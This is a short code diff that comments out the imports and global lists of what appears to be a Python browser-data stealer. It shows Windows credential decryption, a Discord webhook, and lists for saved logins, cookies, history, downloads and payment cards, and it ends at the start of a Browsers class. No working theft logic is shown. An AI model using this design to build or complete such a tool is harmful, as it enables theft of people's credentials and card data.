@@ -1,20 +1,18 @@
-import base64
-import json
-import os
-import shutil
-import sqlite3
-from pathlib import Path
-from zipfile import ZipFile
-
-from Crypto.Cipher import AES
-from discord import Embed, File, SyncWebhook
-from win32crypt import CryptUnprotectData
-
-__LOGINS__ = []
-__COOKIES__ = []
-__WEB_HISTORY__ = []
-__DOWNLOADS__ = []
-__CARDS__ = []
+# import base64
+# import json
+# import os
+# import shutil
+# import sqlite3
+# from pathlib import Path
+# from zipfile import ZipFile
+# from Crypto.Cipher import AES
+# from discord import Embed, File, SyncWebhook
+# from win32crypt import CryptUnprotectData
+# __LOGINS__ = []
+# __COOKIES__ = []
+# __WEB_HISTORY__ = []
+# __DOWNLOADS__ = []
+# __CARDS__ = []
 
 class Browsers:
     def __init__(self, webhook):
